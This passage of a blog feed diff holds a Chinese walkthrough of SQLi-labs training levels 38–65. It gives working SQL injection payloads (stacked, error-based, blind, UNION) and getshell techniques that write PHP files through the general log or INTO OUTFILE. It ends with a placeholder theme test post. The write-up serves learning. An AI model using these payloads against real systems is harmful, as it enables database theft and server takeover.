+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysqli_more_results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 是否有更多结果
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;c1&#34;&gt;//printf(&amp;#34;-----------------\n&amp;#34;);
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+     &lt;span class=&#34;c1&#34;&gt;//while (mysqli_next_result($con1));
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲、堆叠&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;后续利用&#34;&gt;后续利用&lt;/h3&gt;
+&lt;p&gt;堆叠注入可以执行任意SQL语句，那么就可以进行&lt;strong&gt;开启日志getshell&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;前提：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;有web目录的物理路径&lt;/li&gt;
+&lt;li&gt;MySQL用户可以对web目录有读写权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&#39;;set global general_log = &amp;quot;On&amp;quot;;set global general_log_file=&#39;/var/www/html/shell.php&#39;;--+
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&#39;;select &amp;lt;?php phpinfo(); ?&amp;gt;;--+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问shell.php即可&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;本题开启日志getshell尝试过程中，发现&lt;/strong&gt;&lt;code&gt;set global general_log_file=&#39;/var/www/html/shell.php&#39;&lt;/code&gt;一直执行失败，原因是：&lt;code&gt;/var/&lt;/code&gt;目录不属于mysql用户，无法设置成功，进入容器修改目录权限即可执行成功&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;less-39&#34;&gt;Less-39&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;直接拼&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲、堆叠&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-38类似&lt;/p&gt;
+&lt;h2 id=&#34;less-40&#34;&gt;Less-40&lt;/h2&gt;
+&lt;p&gt;拼接方式：单引号 + 括号&lt;/p&gt;
+&lt;p&gt;其余与Less-38类似&lt;/p&gt;
+&lt;h2 id=&#34;less-41&#34;&gt;Less-41&lt;/h2&gt;
+&lt;p&gt;拼接方式：直接拼&lt;/p&gt;
+&lt;p&gt;注入类型：无法报错注入&lt;/p&gt;
+&lt;p&gt;其余与Less-39类似&lt;/p&gt;
+&lt;h2 id=&#34;less-42&#34;&gt;Less-42&lt;/h2&gt;
+&lt;p&gt;login.php:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;login_user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;login_password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; and password=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;mysqli_multi_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;查询成功：&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysqli_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;登录成功&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Auth&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;跳转到&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;logged&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;logged-in.php:&lt;/p&gt;
+&lt;p&gt;提供修改密码功能&lt;/p&gt;
+&lt;p&gt;pass_change.php：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;未登录&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;重定向&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;修改密码表单&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$curr_pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;current_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$re_pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;re_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$re_pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;UPDATE users SET PASSWORD=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; and password=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$curr_pass&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;分析-2&#34;&gt;分析&lt;/h3&gt;
+&lt;p&gt;第一处漏洞发生在登录时的password未过滤，可进行报错、堆叠、union等注入&lt;/p&gt;
+&lt;p&gt;第二处漏洞发生在update更新密码时对从session中获得的用户名未做过滤，利用方式与Less-24类似&lt;/p&gt;
+&lt;h2 id=&#34;less-43&#34;&gt;Less-43&lt;/h2&gt;
+&lt;p&gt;拼接方式：POST + 单引号 + 但括号&lt;/p&gt;
+&lt;p&gt;其余与Less-42类似&lt;/p&gt;
+&lt;h2 id=&#34;less-44&#34;&gt;Less-44&lt;/h2&gt;
+&lt;p&gt;拼接方式：单引号&lt;/p&gt;
+&lt;p&gt;注入类型：少了报错&lt;/p&gt;
+&lt;p&gt;其余与Less-43类似&lt;/p&gt;
+&lt;h2 id=&#34;less-45&#34;&gt;Less-45&lt;/h2&gt;
+&lt;p&gt;注入类型：少了报错&lt;/p&gt;
+&lt;p&gt;其余与Less-43类似&lt;/p&gt;
+&lt;h2 id=&#34;less-46&#34;&gt;Less-46&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sort&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users ORDER BY &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;查询成功：&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;输出查询结果&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;：&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注入位置发生在&lt;strong&gt;order by 子句&lt;/strong&gt;上&lt;/p&gt;
+&lt;h3 id=&#34;探测方式&#34;&gt;探测方式&lt;/h3&gt;
+&lt;p&gt;更换id发现排序方式不同，可能是用不同的列进行排序&lt;/p&gt;
+&lt;h4 id=&#34;升降&#34;&gt;升降&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 升序
+?sort=1 asc
+
+# 降序
+?sort=1 desc
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;rand函数&#34;&gt;rand()函数&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=rand(true)
+?sort=rand(false)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;二者返回结果不一样，且是固定的，因此可进行布尔、延时盲注&lt;/p&gt;
+&lt;h4 id=&#34;延时探测&#34;&gt;延时探测&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=sleep(1)
+?sort=(sleep(1))
+?sort=1 and sleep(1)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;返回时间为查询结果行数 * 1 秒&lt;/p&gt;
+&lt;h3 id=&#34;利用-1&#34;&gt;利用&lt;/h3&gt;
+&lt;h4 id=&#34;报错&#34;&gt;报错&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 利用procedure analyse 参数报错
+?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;盲注&#34;&gt;盲注&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=rand(left(database(),1)=&#39;s&#39;)
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 延时
+?sort=rand(if(ascii(substr(database(),1,1))=115,1,sleep(1)))
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;into-outfile-1&#34;&gt;into outfile&lt;/h4&gt;
+&lt;p&gt;直接导出(注意需要有写权限)：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=1 into outfile &amp;quot;/var/www/html/less46.txt&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;getshell：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=1 into outfile &amp;quot;/var/www/html/shell.php&amp;quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;限定每一行以0x3c3f70687020706870696e666f28293b3f3e(&lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;的十六进制编码)为结尾&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1380; 
+			flex-basis: 3314px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20220102111114981.png&#34; data-size=&#34;1961x142&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20220102111114981.png&#34;
+			width=&#34;1961&#34;
+			height=&#34;142&#34;
+			srcset=&#34;https://coollllllll.github.io/p/sql/image-20220102111114981_huf0f2d884c33af30dee8fead53b5e6bd2_64278_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20220102111114981_huf0f2d884c33af30dee8fead53b5e6bd2_64278_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less-47&#34;&gt;Less-47&lt;/h2&gt;
+&lt;p&gt;拼接方式：单引号&lt;/p&gt;
+&lt;p&gt;其余与Less-46类似&lt;/p&gt;
+&lt;h2 id=&#34;less-48&#34;&gt;Less-48&lt;/h2&gt;
+&lt;p&gt;注入类型：少了报错&lt;/p&gt;
+&lt;p&gt;其余与Less-46类似&lt;/p&gt;
+&lt;h2 id=&#34;less-49&#34;&gt;Less-49&lt;/h2&gt;
+&lt;p&gt;注入类型：少了报错&lt;/p&gt;
+&lt;p&gt;其余与Less-47类似&lt;/p&gt;
+&lt;h2 id=&#34;less-50&#34;&gt;Less-50&lt;/h2&gt;
+&lt;p&gt;注入类型：可以堆叠注入&lt;/p&gt;
+&lt;p&gt;其余与Less-46类似&lt;/p&gt;
+&lt;h2 id=&#34;less-51-53&#34;&gt;Less-51-53&lt;/h2&gt;
+&lt;p&gt;与Less50类似，只是在在注入类型和拼接方式上有变化&lt;/p&gt;
+&lt;h2 id=&#34;less-54&#34;&gt;Less-54&lt;/h2&gt;
+&lt;p&gt;index.php：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if $_GET[&#39;id&#39;]:
+    计数器加1；
+    if 计数器超过10次：
+    	提示失败
+    $sql=&amp;quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&amp;quot;;
+    if 有查询成功:
+        输出查询信息
+    else：
+        pass
+
+$key = addslashes($_POST[&#39;key&#39;]);
+$key = mysql_real_escape_string($key);
+$sql=&amp;quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要求从challenges数据库中10次得到secret key&lt;/p&gt;
+&lt;h3 id=&#34;利用-2&#34;&gt;利用&lt;/h3&gt;
+&lt;p&gt;判断闭合：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=1&#39; --+
+
+可用union注入
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;判断字段数目：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=1&#39; order by 3--+
+?id=1&#39; order by 4--+
+
+结果为3
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;判断可注入的字段位置：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=-1&#39; union select 1,2,3 --+
+
+2和3可以
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询表名：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=&#39;challenges&#39;) --+
+
+表名F6ZVUD1OQV
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询列名：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=&#39;F6ZVUD1OQV&#39;)--+
+
+id,sessid,secret_MJF9,tryy
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查目标结果：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_MJF9)+FROM+F6ZVUD1OQV)--+
+
+5p85ATWNXGEvh89AXJ4GteMe
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less-55-57&#34;&gt;Less-55-57&lt;/h2&gt;
+&lt;p&gt;与Less-54类似，只是在闭合方式上有变化&lt;/p&gt;
+&lt;h2 id=&#34;less-58&#34;&gt;Less-58&lt;/h2&gt;
+&lt;p&gt;与Less-54相比，这一关在输出信息时不是直接将查询结果返回，而是根据查询结果中的id字段从硬编码数组中取信息，这样union注入就无用了&lt;/p&gt;
+&lt;p&gt;但是又输出了报错信息，因此可利用报错注入&lt;/p&gt;
+&lt;h2 id=&#34;less-59-65&#34;&gt;Less-59-65&lt;/h2&gt;
+&lt;p&gt;与Less58类似，只是在闭合方式和注入类型少有区别&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Chinese Test</title>
+        <link>https://coollllllll.github.io/p/test-chinese/</link>
+        <pubDate>Wed, 09 Sep 2020 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/test-chinese/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash.jpg" alt="Featured image of post Chinese Test" /&gt;&lt;h2 id=&#34;正文测试&#34;&gt;正文测试&lt;/h2&gt;
+&lt;p&gt;而这些并不是完全重要，更加重要的问题是， 带着这些问题，我们来审视一下学生会退会。 既然如何， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 我们不得不面对一个非常尴尬的事实，那就是， 可是，即使是这样，学生会退会的出现仍然代表了一定的意义。 学生会退会，发生了会如何，不发生又会如何。 经过上述讨论， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 学生会退会，到底应该如何实现。 这样看来， 在这种困难的抉择下，本人思来想去，寝食难安。 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 就我个人来说，学生会退会对我的意义，不能不说非常重大。 莎士比亚曾经提到过，人的一生是短的，但如果卑劣地过这一生，就太长了。这似乎解答了我的疑惑。 莫扎特说过一句富有哲理的话，谁和我一样用功，谁就会和我一样成功。这启发了我， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 学生会退会，到底应该如何实现。 一般来说， 从这个角度来看， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 在这种困难的抉择下，本人思来想去，寝食难安。 了解清楚学生会退会到底是一种怎么样的存在，是解决一切问题的关键。 一般来说， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 问题的关键究竟为何？ 而这些并不是完全重要，更加重要的问题是。&lt;/p&gt;
+&lt;p&gt;奥斯特洛夫斯基曾经说过，共同的事业，共同的斗争，可以使人们产生忍受一切的力量。　带着这句话，我们还要更加慎重的审视这个问题： 一般来讲，我们都必须务必慎重的考虑考虑。 既然如此， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 带着这些问题，我们来审视一下学生会退会。 我认为， 我认为， 在这种困难的抉择下，本人思来想去，寝食难安。 问题的关键究竟为何？ 每个人都不得不面对这些问题。 在面对这种问题时， 要想清楚，学生会退会，到底是一种怎么样的存在。 我认为， 既然如此， 每个人都不得不面对这些问题。 在面对这种问题时， 那么， 我认为， 学生会退会因何而发生。&lt;/p&gt;
+&lt;h2 id=&#34;引用&#34;&gt;引用&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;思念是最暖的忧伤像一双翅膀&lt;br&gt;
+让我停不了飞不远在过往游荡&lt;br&gt;
+不告而别的你 就算为了我着想&lt;br&gt;
+这么沉痛的呵护 我怎么能翱翔&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=3aypp_YlBzI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;最暖的憂傷 - 田馥甄&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;图片&#34;&gt;图片&lt;/h2&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 66; 
+			flex-basis: 160px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash.jpg&#34; data-size=&#34;667x1000&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash.jpg&#34;
+			width=&#34;667&#34;
+			height=&#34;1000&#34;
+			srcset=&#34;https://coollllllll.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash_hu595aaf3b3dbbb41af5aed8d3958cc9f9_13854_480x0_resize_q75_box.jpg 480w, https://coollllllll.github.io/p/test-chinese/florian-klauer-nptLmg6jqDo-unsplash_hu595aaf3b3dbbb41af5aed8d3958cc9f9_13854_1024x0_resize_q75_box.jpg 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Photo by Florian Klauer on Unsplash&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Photo by Florian Klauer on Unsplash&lt;/figcaption&gt;
+	
+&lt;/figure&gt;  &lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 149; 
+			flex-basis: 359px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash.jpg&#34; data-size=&#34;1000x667&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/test-chinese/luca-bravo-alS7ewQ41M8-unsplash.jpg&#34;
+			width=&#34;1000&#34;
+			height=&#34;667&#34;
